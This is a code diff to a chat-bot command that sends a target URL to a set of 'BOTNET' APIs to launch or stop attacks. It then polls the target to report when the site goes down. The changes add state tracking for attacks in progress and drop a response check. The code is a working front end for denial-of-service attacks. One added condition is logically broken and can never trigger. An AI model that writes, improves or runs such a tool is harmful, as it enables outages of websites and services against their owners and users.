@@ -28,6 +28,7 @@ module.exports.run = async ({ args, chat, font }) => {
 
   let attackInterval = null;
   let errorMessageSent = false;
+  let isAttackInitiated = false; // Track if an attack is in progress
 
   const tryAttack = async (apis, index = 0) => {
     if (index >= apis.length) {
@@ -36,6 +37,11 @@ module.exports.run = async ({ args, chat, font }) => {
           "All BOTNETs are currently busy, try again later after all attacks are finished!"
         )
       );
+    }
+
+    // Prevent multiple initiations
+    if (isAttackInitiated && !targetUrl.toLowerCase() === "stop") {
+      return chat.reply(font.thin("An attack is already in progress!"));
     }
 
     try {
@@ -53,49 +59,49 @@ module.exports.run = async ({ args, chat, font }) => {
         );
 
         preparingMessage.delete();
-
-        // Validate response: Assume success if HTTP status is 200 and no error
-        if (response.status !== 200) {
-          throw new Error("Attack initiation failed: Invalid response status");
-        }
+        isAttackInitiated = true; // Mark attack as initiated
       } else {
         response = await axios.get(`${apis[index]}/stop`, { timeout: 10000 });
 
-        // Clear any existing interval
+        // Clear attack state
+        isAttackInitiated = false;
         if (attackInterval) {
           clearInterval(attackInterval);
           attackInterval = null;
         }
       }
 
-      // Use response.data.message if available, otherwise a default message
+      // Display response message or default
       await chat.reply(
-        font.thin(response.data.message || (isStopCommand ? "Attack stopped!" : "Attack initiated successfully!"))
+        font.thin(response.data?.message || (isStopCommand ? "Attack stopped!" : "Attack initiated successfully!"))
       );
 
-      // Only start monitoring if it's not a stop command
+      // Start monitoring if not a stop command
       if (!isStopCommand) {
         attackInterval = setInterval(async () => {
           if (errorMessageSent) {
             clearInterval(attackInterval);
             attackInterval = null;
+            isAttackInitiated = false; // Reset on error
             return;
           }
 
           try {
             await axios.get(targetUrl.match(/^(https?:\/\/[^\/]+)/)[0], {
-              timeout: 5000,
+              timeout: 10000,
             });
           } catch (error) {
             if (errorMessageSent) {
               clearInterval(attackInterval);
               attackInterval = null;
+              isAttackInitiated = false; // Reset on error
               return;
             }
 
             errorMessageSent = true;
             clearInterval(attackInterval);
             attackInterval = null;
+            isAttackInitiated = false; // Reset on error
 
             if (error.response) {
               if (error.response.status === 503) {
@@ -109,13 +115,14 @@ module.exports.run = async ({ args, chat, font }) => {
       }
     } catch (error) {
       if (error.code === "ENOTFOUND" || error.code === "ECONNABORTED") {
-        // Retry with the next API for network errors
-        return tryAttack(apis, index + 1);
+        // Retry with next API only if attack not initiated
+        if (!isAttackInitiated) {
+          return tryAttack(apis, index + 1);
+        }
       } else {
-        // Report other errors without retrying
-        await chat.reply(
-          font.thin(`Failed to initiate attack: ${error.message}`)
-        );
+        // Report error and reset state
+        isAttackInitiated = false;
+        await chat.reply(font.thin(`Failed to initiate attack: ${error.message}`));
       }
     }
   };
